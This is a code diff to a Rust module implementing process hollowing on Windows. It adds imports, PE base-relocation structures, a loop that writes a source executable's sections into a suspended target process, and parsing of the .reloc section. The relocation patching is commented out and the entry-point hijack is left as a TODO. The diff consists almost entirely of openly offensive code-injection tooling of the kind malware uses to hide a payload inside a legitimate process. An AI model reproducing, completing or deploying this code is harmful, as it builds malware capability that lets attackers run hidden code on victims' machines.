@@ -1,3 +1,6 @@
+#[macro_use]
+extern crate bitfield;
+
 pub mod pe;
 
 // TODO: remove this module
@@ -8,21 +11,40 @@ use crate::pe::{
     X96, x96_check, x96_check_from_remote
 };
 use anyhow::*;
+use ntapi::ntmmapi:: NtUnmapViewOfSection;
+use winapi::shared::{
+    ntdef::{ BOOLEAN, HANDLE, ULONG },
+    minwindef::{ LPCVOID, PUCHAR, UCHAR }
+};
 use winapi::um::{
-    memoryapi::{ VirtualAllocEx, WriteProcessMemory },
+    memoryapi::{ VirtualAllocEx, ReadProcessMemory, WriteProcessMemory },
     processthreadsapi::{ CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION },
     winbase::CREATE_SUSPENDED,
-    winnt:: { MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE }
+    winnt:: { IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE }
 };
-use ntapi::ntmmapi:: NtUnmapViewOfSection;
 
-use std::fs::File;
+use std::{fs::File, mem::size_of};
 use std::ffi::CString;
 use std::mem::zeroed;
 use std::io::prelude::*;
 use std::ptr::null_mut;
 
 const STATUS_SUCCESS: i32 = 0x0;
+const DOT_RELOC: [u8; 8] = [46, 114, 101, 108, 111, 99, 0, 0];
+
+#[repr(C)]
+struct BASE_RELOCATION_BLOCK {
+    PageAddress: u32,
+    BlockSize: u32,
+}
+
+bitfield! {
+    struct BASE_RELOCATION_ENTRY(MSB0 [u8]);
+    impl Debug;
+    u8;
+    u8, block_type, _: 3, 0;
+    u16, offset, _: 15, 4;
+}
 
 pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
     // Create dest process
@@ -94,6 +116,82 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
         bail!("could not write process memory.");
     }
 
+    let src_sections = std::slice::from_raw_parts(src_image.Sections, src_image.NumberOfSections as usize);
+
+    for section in src_sections {
+        // TODO: remove debug print
+        println!("pointer to raw data: 0x{:x}", section.PointerToRawData);
+        println!("pointer to raw data size: 0x{:x}", section.SizeOfRawData);
+
+        let p_dest_section = dest_image_address as usize + section.VirtualAddress as usize;
+
+        // TODO: remove debug print
+        println!("writing {:?} section to 0x{:x}", section.Name, p_dest_section);
+
+        if WriteProcessMemory(
+            hp, p_dest_section as *mut _, &mut buffer[section.PointerToRawData as usize] as *const _ as *mut _,
+            section.SizeOfRawData as usize, null_mut()) == 0 {
+            bail!("could not write process memory.");
+        }
+    }
+
+    if delta != 0x0 {
+        for section in src_sections {
+            // TODO: remove debug print
+            println!("section name: {:?}", String::from_utf8(section.Name.into()));
+
+            //if memcmp(&section.Name as *const _, &DOT_RELOC as *const _, DOT_RELOC.len()) > 0  { continue }
+            if section.Name != DOT_RELOC { continue }
+
+            // rebase image flow
+            let reloc_address = section.PointerToRawData;
+            let mut offset = 0;
+            let reloc_data = (*src_image.FileHeader).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+
+            while offset < reloc_data.Size {
+                let block_header = std::ptr::read::<BASE_RELOCATION_BLOCK>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);
+
+                offset = offset + std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32;
+
+                // 2 is relocation entry size.
+                // ref: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
+                let entry_count = (block_header.BlockSize - std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32) / 2;
+
+                let read_test = std::ptr::read::<u8>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);
+
+                let block_entry = std::slice::from_raw_parts::<[u8; 2]>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _, entry_count as usize);
+                //BASE_RELOCATION_ENTRY::from_bytes(*(block_buffer as *const _ as *mut [u8; 2]));
+
+                for block in block_entry {
+                    let block = BASE_RELOCATION_ENTRY(*block);
+                    // TODO: remove debug print
+                    println!("block type: {:?}", block.block_type());
+                    println!("block offset: 0x{:x}", block.offset());
+
+                    offset = offset + 2;
+
+                    if block.block_type() == 0 { continue }
+
+                    /*
+                    let field_address = block_header.PageAddress + block.offset() as u32;
+                    println!("page address: {:?}", dest_image_address);
+                    println!("page address: 0x{:x}", block_header.PageAddress);
+                    println!("field_address: 0x{:x}", field_address);
+
+                    let mut d_buffer = zeroed::<u32>();
+
+                    if ReadProcessMemory(
+                        hp, (dest_image_address as u32 + field_address) as LPCVOID,
+                        &mut d_buffer as *const _ as *mut _, size_of::<u32>(), null_mut()) != 1 {
+                        bail!("could not read process memory.");
+                    }
+                    println!("d_buffer: {:?}", d_buffer);
+                    d_buffer = d_buffer + delta as u32;*/
+                }
+            }
+        }
+    }
+
     // TODO: Get thread context of dest, and modify entry point
     if false { unimplemented!() }
 
@@ -104,4 +202,17 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
     println!("process was hollowed ε٩(๑> 3 <)۶з");
 
     Ok(())
+}
+
+pub unsafe extern fn memcmp(s1: *const u8, s2: *const u8, n: usize) -> i32 {
+    let mut i = 0;
+    while i < n {
+        let a = *s1.offset(i as isize);
+        let b = *s2.offset(i as isize);
+        if a != b {
+            return a as i32 - b as i32
+        }
+        i += 1;
+    }
+    return 0;
 }
